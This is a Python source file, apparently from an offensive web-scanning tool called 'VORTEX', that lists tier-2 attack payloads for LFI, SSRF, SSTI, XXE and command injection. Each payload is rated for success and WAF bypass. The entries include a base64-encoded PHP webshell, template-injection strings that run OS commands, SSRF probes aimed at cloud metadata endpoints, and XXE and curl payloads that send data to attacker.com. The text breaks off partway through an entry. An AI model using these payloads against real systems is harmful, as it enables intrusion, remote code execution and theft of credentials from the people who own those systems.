"""
VORTEX TIER 2 Payloads Part 2 - LFI, SSRF, SSTI, XXE, Command Injection
"""

from core.payloads.curated_payloads import CuratedPayload, VulnType, PayloadTier


def get_tier2_lfi_payloads():
    """LFI TIER 2 payloads (25 additional)."""
    return [
        # PHP wrappers
        CuratedPayload(
            "php://filter/convert.base64-encode/resource=index.php",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.72, false_positive_rate=0.08,
            description="PHP filter base64", tags=["php", "filter", "wrapper"],
            source="seclists"
        ),
        CuratedPayload(
            "php://filter/read=string.rot13/resource=index.php",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.74, false_positive_rate=0.09,
            description="PHP filter ROT13", tags=["php", "filter"],
            source="custom"
        ),
        CuratedPayload(
            "php://filter/convert.iconv.utf-8.utf-7/resource=index.php",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.76, false_positive_rate=0.10,
            description="PHP iconv filter", tags=["php", "filter", "encoding"],
            source="custom"
        ),
        # Data wrapper
        CuratedPayload(
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.78, false_positive_rate=0.12,
            description="Data wrapper RCE", tags=["php", "data", "rce"],
            source="seclists"
        ),
        # Expect wrapper
        CuratedPayload(
            "expect://id",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.52, waf_bypass_prob=0.80, false_positive_rate=0.14,
            description="Expect wrapper", tags=["php", "expect", "rce"],
            source="seclists"
        ),
        # Zip wrapper
        CuratedPayload(
            "zip://uploads/file.zip%23shell.php",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Zip wrapper", tags=["php", "zip", "upload"],
            source="custom"
        ),
        # Phar wrapper
        CuratedPayload(
            "phar://uploads/file.phar/shell.php",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.50, waf_bypass_prob=0.78, false_positive_rate=0.15,
            description="Phar wrapper", tags=["php", "phar"],
            source="custom"
        ),
        # Log poisoning paths
        CuratedPayload(
            "/var/log/apache2/access.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.68, false_positive_rate=0.09,
            description="Apache access log", tags=["log_poisoning", "linux"],
            source="seclists"
        ),
        CuratedPayload(
            "/var/log/apache2/error.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Apache error log", tags=["log_poisoning", "linux"],
            source="seclists"
        ),
        CuratedPayload(
            "/var/log/nginx/access.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.66, false_positive_rate=0.09,
            description="Nginx access log", tags=["log_poisoning", "linux"],
            source="seclists"
        ),
        CuratedPayload(
            "/var/log/nginx/error.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.66, false_positive_rate=0.09,
            description="Nginx error log", tags=["log_poisoning", "linux"],
            source="seclists"
        ),
        # SSH logs
        CuratedPayload(
            "/var/log/auth.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="SSH auth log", tags=["log_poisoning", "linux"],
            source="seclists"
        ),
        # Mail logs
        CuratedPayload(
            "/var/log/mail.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.72, false_positive_rate=0.12,
            description="Mail log", tags=["log_poisoning", "linux"],
            source="custom"
        ),
        # Proc filesystem
        CuratedPayload(
            "/proc/self/environ",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.10,
            description="Process environment", tags=["proc", "linux"],
            source="seclists"
        ),
        CuratedPayload(
            "/proc/self/cmdline",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Process command line", tags=["proc", "linux"],
            source="custom"
        ),
        # Session files
        CuratedPayload(
            "/tmp/sess_*",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.74, false_positive_rate=0.13,
            description="Session files", tags=["session", "php"],
            source="custom"
        ),
        CuratedPayload(
            "/var/lib/php/sessions/sess_*",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.72, false_positive_rate=0.12,
            description="PHP session path", tags=["session", "php"],
            source="custom"
        ),
        # Windows paths
        CuratedPayload(
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.64, false_positive_rate=0.08,
            description="Windows hosts", tags=["windows"],
            source="seclists"
        ),
        CuratedPayload(
            "C:\\inetpub\\wwwroot\\web.config",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="IIS web.config", tags=["windows", "iis"],
            source="seclists"
        ),
        CuratedPayload(
            "C:\\xampp\\apache\\logs\\access.log",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="XAMPP access log", tags=["windows", "xampp", "log_poisoning"],
            source="custom"
        ),
        # Double encoding
        CuratedPayload(
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Double URL encoded", tags=["bypass", "encoding"],
            source="custom"
        ),
        # UTF-8 encoding
        CuratedPayload(
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.50, waf_bypass_prob=0.78, false_positive_rate=0.15,
            description="UTF-8 encoding bypass", tags=["bypass", "encoding"],
            source="custom"
        ),
        # Unicode bypass
        CuratedPayload(
            "..%u2216..%u2216..%u2216etc%u2216passwd",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.48, waf_bypass_prob=0.80, false_positive_rate=0.16,
            description="Unicode bypass", tags=["bypass", "encoding"],
            source="custom"
        ),
        # Path combinations
        CuratedPayload(
            "....//....//....//etc/passwd",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.72, false_positive_rate=0.11,
            description="Double dot-slash", tags=["bypass"],
            source="custom"
        ),
        CuratedPayload(
            "..;/..;/..;/etc/passwd",
            VulnType.LFI, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.74, false_positive_rate=0.12,
            description="Semicolon bypass", tags=["bypass"],
            source="custom"
        ),
    ]


def get_tier2_ssrf_payloads():
    """SSRF TIER 2 payloads (20 additional)."""
    return [
        # Cloud metadata variations
        CuratedPayload(
            "http://169.254.169.254/latest/meta-data/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.72, waf_bypass_prob=0.68, false_positive_rate=0.07,
            description="AWS metadata", tags=["cloud", "aws"],
            source="seclists"
        ),
        CuratedPayload(
            "http://169.254.169.254/latest/user-data/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.68, false_positive_rate=0.08,
            description="AWS userdata", tags=["cloud", "aws"],
            source="seclists"
        ),
        CuratedPayload(
            "http://metadata.google.internal/computeMetadata/v1/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="GCP metadata", tags=["cloud", "gcp"],
            source="seclists"
        ),
        CuratedPayload(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="Azure metadata", tags=["cloud", "azure"],
            source="seclists"
        ),
        # IP encoding variations
        CuratedPayload(
            "http://2852039166/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.76, false_positive_rate=0.11,
            description="Decimal IP (169.254.169.254)", tags=["encoding", "bypass"],
            source="custom"
        ),
        CuratedPayload(
            "http://0xA9FEA9FE/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.78, false_positive_rate=0.12,
            description="Hex IP", tags=["encoding", "bypass"],
            source="custom"
        ),
        CuratedPayload(
            "http://0251.0376.0251.0376/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.80, false_positive_rate=0.13,
            description="Octal IP", tags=["encoding", "bypass"],
            source="custom"
        ),
        # DNS rebinding
        CuratedPayload(
            "http://127.0.0.1.nip.io/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.72, false_positive_rate=0.10,
            description="nip.io DNS", tags=["dns", "bypass"],
            source="custom"
        ),
        CuratedPayload(
            "http://169.254.169.254.xip.io/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.74, false_positive_rate=0.10,
            description="xip.io DNS", tags=["dns", "bypass"],
            source="custom"
        ),
        # Protocol variations
        CuratedPayload(
            "file:///etc/passwd",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="File protocol", tags=["protocol", "file"],
            source="seclists"
        ),
        CuratedPayload(
            "gopher://127.0.0.1:25/_MAIL",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Gopher SMTP", tags=["protocol", "gopher"],
            source="seclists"
        ),
        CuratedPayload(
            "dict://localhost:11211/stat",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.52, waf_bypass_prob=0.78, false_positive_rate=0.14,
            description="Dict memcached", tags=["protocol", "dict"],
            source="custom"
        ),
        # Internal services
        CuratedPayload(
            "http://localhost:6379/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.72, false_positive_rate=0.09,
            description="Redis internal", tags=["internal", "redis"],
            source="custom"
        ),
        CuratedPayload(
            "http://127.0.0.1:5984/_utils/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.72, false_positive_rate=0.10,
            description="CouchDB admin", tags=["internal", "couchdb"],
            source="custom"
        ),
        CuratedPayload(
            "http://localhost:8080/manager/html",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.10,
            description="Tomcat manager", tags=["internal", "tomcat"],
            source="custom"
        ),
        # URL bypass techniques
        CuratedPayload(
            "http://127.0.0.1@evil.com/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.76, false_positive_rate=0.12,
            description="URL credential bypass", tags=["bypass"],
            source="custom"
        ),
        CuratedPayload(
            "http://evil.com#@127.0.0.1/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.78, false_positive_rate=0.13,
            description="URL fragment bypass", tags=["bypass"],
            source="custom"
        ),
        # Localhost variations
        CuratedPayload(
            "http://[::1]/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.68, false_positive_rate=0.08,
            description="IPv6 localhost", tags=["ipv6"],
            source="custom"
        ),
        CuratedPayload(
            "http://0/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="Short localhost", tags=["bypass"],
            source="custom"
        ),
        CuratedPayload(
            "http://127.1/",
            VulnType.SSRF, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.72, false_positive_rate=0.09,
            description="Short localhost variant", tags=["bypass"],
            source="custom"
        ),
    ]


def get_tier2_ssti_payloads():
    """SSTI TIER 2 payloads (22 additional)."""
    return [
        # Jinja2 advanced
        CuratedPayload(
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Jinja2 OS popen", tags=["jinja2", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.72, false_positive_rate=0.11,
            description="Jinja2 cycler bypass", tags=["jinja2", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "{{lipsum.__globals__['os'].popen('id').read()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="Jinja2 lipsum", tags=["jinja2", "rce"],
            source="custom"
        ),
        # Twig advanced
        CuratedPayload(
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.74, false_positive_rate=0.12,
            description="Twig filter callback", tags=["twig", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "{{['id']|map('system')|join}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Twig map filter", tags=["twig", "rce"],
            source="custom"
        ),
        # Smarty advanced
        CuratedPayload(
            "{system('id')}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Smarty system", tags=["smarty", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "{php}system('id');{/php}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.72, false_positive_rate=0.13,
            description="Smarty PHP tag", tags=["smarty", "rce"],
            source="custom"
        ),
        # Freemarker
        CuratedPayload(
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="Freemarker Execute", tags=["freemarker", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.74, false_positive_rate=0.12,
            description="Freemarker file read", tags=["freemarker", "file_read"],
            source="custom"
        ),
        # Velocity
        CuratedPayload(
            "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Velocity Runtime", tags=["velocity", "rce"],
            source="seclists"
        ),
        # Pug/Jade
        CuratedPayload(
            "#{global.process.mainModule.require('child_process').execSync('id')}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.72, false_positive_rate=0.11,
            description="Pug/Jade RCE", tags=["pug", "nodejs", "rce"],
            source="custom"
        ),
        # ERB (Ruby)
        CuratedPayload(
            "<%= system('id') %>",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.66, false_positive_rate=0.09,
            description="ERB system", tags=["erb", "ruby", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "<%= `id` %>",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.64, false_positive_rate=0.08,
            description="ERB backticks", tags=["erb", "ruby", "rce"],
            source="seclists"
        ),
        CuratedPayload(
            "<%= IO.popen('id').readlines() %>",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.68, false_positive_rate=0.09,
            description="ERB IO.popen", tags=["erb", "ruby", "rce"],
            source="custom"
        ),
        # Tornado
        CuratedPayload(
            "{% import os %}{{os.popen('id').read()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="Tornado import", tags=["tornado", "python", "rce"],
            source="custom"
        ),
        # Handlebars
        CuratedPayload(
            "{{#with 'constructor' as |c|}}{{#with c as |constructor|}}{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}{{/with}}{{/with}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.52, waf_bypass_prob=0.78, false_positive_rate=0.14,
            description="Handlebars prototype", tags=["handlebars", "nodejs", "rce"],
            source="seclists"
        ),
        # Mako
        CuratedPayload(
            "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Mako import", tags=["mako", "python", "rce"],
            source="custom"
        ),
        # Jade/Pug (Node.js)
        CuratedPayload(
            "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('id')}()}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.74, false_positive_rate=0.13,
            description="Jade/Pug advanced", tags=["jade", "nodejs", "rce"],
            source="custom"
        ),
        # Django additional
        CuratedPayload(
            "{% load module %}{% custom_tag %}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.50, waf_bypass_prob=0.76, false_positive_rate=0.15,
            description="Django custom tag", tags=["django", "python"],
            source="custom"
        ),
        # Flask/Jinja2 config read
        CuratedPayload(
            "{{config.items()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.72, waf_bypass_prob=0.64, false_positive_rate=0.08,
            description="Flask config read", tags=["flask", "jinja2", "info_disclosure"],
            source="custom"
        ),
        CuratedPayload(
            "{{self.__dict__}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.66, false_positive_rate=0.09,
            description="Self dict inspection", tags=["jinja2", "info_disclosure"],
            source="custom"
        ),
        # Obfuscation
        CuratedPayload(
            "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}",
            VulnType.SSTI, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.72, false_positive_rate=0.12,
            description="Obfuscated import", tags=["jinja2", "obfuscation", "rce"],
            source="custom"
        ),
    ]


def get_tier2_xxe_payloads():
    """XXE TIER 2 payloads (18 additional)."""
    return [
        # Parameter entities
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.68, false_positive_rate=0.10,
            description="Parameter entity OOB", tags=["parameter_entity", "oob"],
            source="seclists"
        ),
        # PHP wrapper
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.72, false_positive_rate=0.11,
            description="PHP wrapper XXE", tags=["php", "filter"],
            source="custom"
        ),
        # UTF-16 encoding
        CuratedPayload(
            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.74, false_positive_rate=0.12,
            description="UTF-16 encoded", tags=["encoding", "bypass"],
            source="custom"
        ),
        # CDATA escape
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe2 "<![CDATA[&xxe;]]>">]><foo>&xxe2;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="CDATA wrapper", tags=["cdata", "bypass"],
            source="custom"
        ),
        # External DTD variations
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>test</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="External DTD", tags=["external_dtd", "oob"],
            source="seclists"
        ),
        # SOAP XXE
        CuratedPayload(
            '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.72, false_positive_rate=0.11,
            description="SOAP envelope XXE", tags=["soap"],
            source="custom"
        ),
        # SVG XXE
        CuratedPayload(
            '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.74, false_positive_rate=0.12,
            description="SVG XXE", tags=["svg"],
            source="custom"
        ),
        # Billion laughs DoS
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Billion laughs", tags=["dos"],
            source="seclists"
        ),
        # Jar protocol
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///var/www/uploads/file.jar!/file.txt">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.50, waf_bypass_prob=0.78, false_positive_rate=0.15,
            description="JAR protocol", tags=["protocol", "java"],
            source="custom"
        ),
        # Netdoc protocol
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.52, waf_bypass_prob=0.76, false_positive_rate=0.14,
            description="Netdoc protocol", tags=["protocol", "java"],
            source="custom"
        ),
        # Error-based XXE
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><foo>test</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.74, false_positive_rate=0.13,
            description="Error-based exfiltration", tags=["error_based", "oob"],
            source="seclists"
        ),
        # XInclude
        CuratedPayload(
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.72, false_positive_rate=0.12,
            description="XInclude", tags=["xinclude"],
            source="seclists"
        ),
        # Windows file paths
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.70, false_positive_rate=0.11,
            description="Windows file", tags=["windows"],
            source="custom"
        ),
        # UNC paths
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://\\\\\\\\attacker.com\\\\share\\\\file.txt">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.54, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="UNC path", tags=["windows", "unc"],
            source="custom"
        ),
        # Expect wrapper (PHP)
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.48, waf_bypass_prob=0.80, false_positive_rate=0.16,
            description="Expect wrapper", tags=["php", "rce"],
            source="custom"
        ),
        # Data URI
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.74, false_positive_rate=0.13,
            description="Data URI", tags=["data_uri"],
            source="custom"
        ),
        # FTP protocol
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.52, waf_bypass_prob=0.76, false_positive_rate=0.14,
            description="FTP protocol", tags=["protocol", "ftp"],
            source="custom"
        ),
        # Gopher protocol
        CuratedPayload(
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://attacker.com:70/file.txt">]><foo>&xxe;</foo>',
            VulnType.XXE, PayloadTier.TIER_2,
            success_rate=0.50, waf_bypass_prob=0.78, false_positive_rate=0.15,
            description="Gopher protocol", tags=["protocol", "gopher"],
            source="custom"
        ),
    ]


def get_tier2_command_injection_payloads():
    """Command Injection TIER 2 payloads (20 additional)."""
    return [
        # More separators
        CuratedPayload(
            "127.0.0.1%0aid",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.68, false_positive_rate=0.08,
            description="Newline separator", tags=["separator"],
            source="custom"
        ),
        CuratedPayload(
            "127.0.0.1%0did",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="Carriage return", tags=["separator"],
            source="custom"
        ),
        # Command substitution
        CuratedPayload(
            "$(whoami)",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.74, waf_bypass_prob=0.64, false_positive_rate=0.07,
            description="Command substitution", tags=["basic"],
            source="seclists"
        ),
        CuratedPayload(
            "`whoami`",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.76, waf_bypass_prob=0.62, false_positive_rate=0.06,
            description="Backtick execution", tags=["basic"],
            source="seclists"
        ),
        # Obfuscation techniques
        CuratedPayload(
            "w`echo h`o`echo a`mi",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.74, false_positive_rate=0.10,
            description="Echo obfuscation", tags=["obfuscation"],
            source="custom"
        ),
        CuratedPayload(
            "who$@ami",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.72, false_positive_rate=0.10,
            description="Variable obfuscation", tags=["obfuscation"],
            source="custom"
        ),
        CuratedPayload(
            "w'h'o'a'm'i",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="Quote obfuscation", tags=["obfuscation"],
            source="custom"
        ),
        # Wildcard techniques
        CuratedPayload(
            "/???/c?t /???/p??s??",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.58, waf_bypass_prob=0.76, false_positive_rate=0.12,
            description="Wildcard obfuscation", tags=["obfuscation", "wildcard"],
            source="custom"
        ),
        # Environment variables
        CuratedPayload(
            "$PATH",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.68, waf_bypass_prob=0.68, false_positive_rate=0.09,
            description="PATH variable", tags=["env_var"],
            source="custom"
        ),
        CuratedPayload(
            "${IFS}",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.70, waf_bypass_prob=0.66, false_positive_rate=0.08,
            description="IFS variable", tags=["env_var", "bypass"],
            source="custom"
        ),
        # Time-based detection
        CuratedPayload(
            "127.0.0.1;sleep 5",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.78, waf_bypass_prob=0.68, false_positive_rate=0.06,
            description="Direct sleep", tags=["time_based"],
            source="seclists"
        ),
        CuratedPayload(
            "127.0.0.1 && sleep 5",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.76, waf_bypass_prob=0.68, false_positive_rate=0.06,
            description="AND sleep", tags=["time_based"],
            source="seclists"
        ),
        # Out-of-band
        CuratedPayload(
            "127.0.0.1;curl http://attacker.com/`whoami`",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.64, waf_bypass_prob=0.72, false_positive_rate=0.10,
            description="Curl exfiltration", tags=["oob", "exfiltration"],
            source="custom"
        ),
        CuratedPayload(
